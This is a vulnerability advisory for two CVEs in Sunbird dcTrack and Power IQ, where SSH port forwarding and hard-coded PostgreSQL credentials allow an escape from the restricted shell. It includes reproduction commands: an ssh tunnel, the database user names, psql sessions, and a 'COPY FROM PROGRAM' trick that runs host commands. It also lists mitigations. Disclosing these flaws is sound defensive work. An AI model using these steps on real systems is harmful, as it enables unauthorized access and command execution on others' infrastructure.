## CVE-2025-66238 and CVE-2025-66237

### CISA ICS Advisory
[ICSA-25-338-05](https://www.cisa.gov/news-events/ics-advisories/icsa-25-338-05)

### Summary

The DCIM dcTrack platform is affected by two vulnerabilities that allow an authenticated user to escape its restricted SSH shell. The first is a misconfiguration that permits SSH port forwarding, enabling access to internal services that should not be reachable. The second is the presence of hard-coded credentials for the platform’s internal PostgreSQL database. Together, these issues allow a restricted user to break out of the limited shell environment and execute arbitrary commands on the underlying system.


### Versions Impacted 

The products affected are :

| Vendor  | Product      | Version Impacted |
| ------- | ------------ | ---------------- |
| Sunbird | DCIM dcTrack | < 9.2.3          |
| Sunbird | Power IQ     | < 9.2.1          |

### Vulnerability Details
#### CVE-2025-66238
The restricted shell that the platforms concerned expose over SSH is intended to limit users and administrators to a narrow and controlled command set. However, SSH port forwarding is not disabled for these accounts. As a result, an authenticated user or administrator can establish local or remote port-forwarding tunnels to services bound only to the host’s internal interfaces.

This vulnerability can be reproduced using an ssh client to connect to the target Sunbird DCIM dcTrack server and port forward to the local Postgres database using the example command :  
```bash
ssh config@TARGET_IP -L 5432:localhost:5432
```

#### CVE-2025-66237

The platform embeds hard-coded credentials for its internal PostgreSQL instance. When combined with SSH port forwarding (**CVE-2025-XXXX**), an authenticated restricted-shell user can connect directly to this database from their local machine.

Multiple database users (odbcuser, raritan and dctrack) used by the platform use default and hard coded credentials for access.

Because the PostgreSQL configuration permits execution pathways that reach the underlying operating system, this access can be leveraged to escape the restricted shell and execute arbitrary commands on the host.

This vulnerability can be reproduced using a Postgres database client using the following parameters :
Port :  `tcp/5432`
Database Name :  `raritan`
Database Users :  
```
odbcuser
raritan
dctrack
```

### Impact : 
By exploiting **CVE-2025-66238**, an attacker can leverage SSH port forwarding to reach backend services on local TCP sockets, escape the restricted shell, and gain access to the platform’s internal PostgreSQL database for privilege escalation.

As an example, the following internal services used by the platform can now be accessed : 
```

tcp6       0      0 :::61616                :::*                    LISTEN      -

tcp6       0      0 :::80                   :::*                    LISTEN      -                   
```

With **CVE-2025-66237**, an attacker who obtains the hard‑coded PostgreSQL credentials can take full control of the database, escalate privileges on the platform, and ultimately execute system commands on the host.

This can be be used to access the database that is used to store configurations, data and authentication details for the platform : 
```
$ psql -h 127.0.0.1 -U raritan raritan
psql (14.15 (Ubuntu 14.15-0ubuntu0.22.04.1), server 12.9)

```

```
raritan=# \c raritan
psql (14.15 (Ubuntu 14.15-0ubuntu0.22.04.1), server 12.9)
You are now connected to database "raritan" as user "raritan".
```

```
raritan=# SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
                        table_name

Additionally, system commands can be run on the host OS (thus bypassing restricted shell access to platform owners) using techniques such as : 
```sql
CREATE table temp(t text);
copy temp from program 'ps -aux'
select * from temp limit 1000 offset 0 ;
```

### Recommended Mitigations
As CISA recommends (in **ICSA-25-338-05**), administrators of these platforms are urged to take defensive measures to minimize the risk of exploitation of this vulnerability, such as : 
* Restrict network access to administrative services for these platforms over SSH.
* Rotate the default SSH passwords for the administrative user `config`.
* Update to the versions : 9.2.3 (dcTrack) and 9.2.1 (Power IQ)
